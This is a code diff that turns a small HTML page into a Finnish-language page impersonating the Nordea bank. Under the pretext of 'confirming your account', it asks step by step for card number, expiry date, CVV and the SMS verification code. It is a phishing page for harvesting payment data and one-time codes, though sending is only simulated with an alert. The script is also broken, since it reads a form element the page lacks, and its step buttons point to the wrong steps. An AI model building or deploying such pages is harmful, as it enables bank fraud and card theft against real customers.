@@ -1,15 +1,208 @@
 <!DOCTYPE html>
-<html>
+<html lang="fi">
 <head>
-    <title>Nordea - Bevestiging van je rekening</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nordea - Tilitodistus</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
             margin: 0;
-            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
         }
+
         .container {
-            width: 400px;
-            margin: 50px auto;
-            padding: 2
+            display: flex;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .left {
+            flex: 1;
+            background-color: #ffffff;
+            border: 1px solid #ccc;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .left h2 {
+            color: #007BFF;
+            margin-bottom: 20px;
+        }
+
+        .left p {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .right {
+            flex: 1;
+            background-color: #007BFF;
+            color: #fff;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .right h2 {
+            margin-bottom: 20px;
+        }
+
+        .right img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+        }
+
+        input[type="text"], input[type="password"] {
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #007BFF;
+            outline: none;
+        }
+
+        button {
+            padding: 12px;
+            background-color: #0056b3;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #003d80;
+        }
+
+        .step {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .step.active {
+            display: flex;
+        }
+
+        .step h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .step p {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .step button.next {
+            margin-top: 20px;
+        }
+
+        .step button.back {
+            margin-bottom: 20px;
+        }
+
+        .step button.next::after {
+            content: " &rarr; ";
+            margin-left: 10px;
+        }
+
+        .step button.back::before {
+            content: " &larr; ";
+            margin-right: 10px;
+        }
+
+        .step input {
+            width: 100%;
+            max-width: 300px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <img src="nordea-logo.png" alt="Nordea Logo">
+            <h2>Nordea</h2>
+            <p>Voit vahvistaa tilisi syöttämällä tiedot:</p>
+            <div class="step active" id="step1">
+                <h3>1. Korttinumero</h3>
+                <p>Kirjoita korttinumero sinun korttisi.</p>
+                <input type="text" name="card_number" placeholder="Korttinumero" required>
+                <button class="next" onclick="nextStep(1)">Seuraava &rarr;</button>
+            </div>
+            <div class="step" id="step2">
+                <h3>2. Käyttöaika</h3>
+                <p>Kirjoita kortin käyttöaika (MM/YY).</p>
+                <input type="text" name="card_expiry" placeholder="Käyttöaika (MM/YY)" required>
+                <button class="back" onclick="nextStep(2)">Takaisin &larr;</button>
+                <button class="next" onclick="nextStep(3)">Seuraava &rarr;</button>
+            </div>
+            <div class="step" id="step3">
+                <h3>3. CVV</h3>
+                <p>Kirjoita kortin CVV-koodi (3-numeroinen koodi).</p>
+                <input type="text" name="card_cvv" placeholder="CVV" required>
+                <button class="back" onclick="nextStep(2)">Takaisin &larr;</button>
+                <button class="next" onclick="nextStep(4)">Seuraava &rarr;</button>
+            </div>
+            <div class="step" id="step4">
+                <h3>4. Vahvistuskoodi (SMS)</h3>
+                <p>Kirjoita vahvistuskoodi, joka lähetettiin sinulle SMS-via.</p>
+                <input type="text" name="verification_code" placeholder="Vahvistuskoodi (SMS)" required>
+                <button class="back" onclick="nextStep(3)">Takaisin &larr;</button>
+                <button class="next" onclick="submitForm()">Lähetä</button>
+            </div>
+        </div>
+        <div class="right">
+            <img src="nordea-logo.png" alt="Nordea Logo">
+            <h2>Tilitodistus</h2>
+            <p>Käytä tätä vahvistamaan tilisi.</p>
+        </div>
+    </div>
+
+    <script>
+        function nextStep(currentStep) {
+            const steps = document.querySelectorAll('.step');
+            steps.forEach((step, index) => {
+                if (index + 1 === currentStep) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+        }
+
+        function submitForm() {
+            const form = document.querySelector('form');
+            const formData = new FormData(form);
+            const data = {};
+            formData.forEach((value, key) => data[key] = value);
+
+            // Simuleer het verzenden van gegevens
+            alert("Tiedot on lähetetty: " + JSON.stringify(data));
+        }
+    </script>
+</body>
+</html>
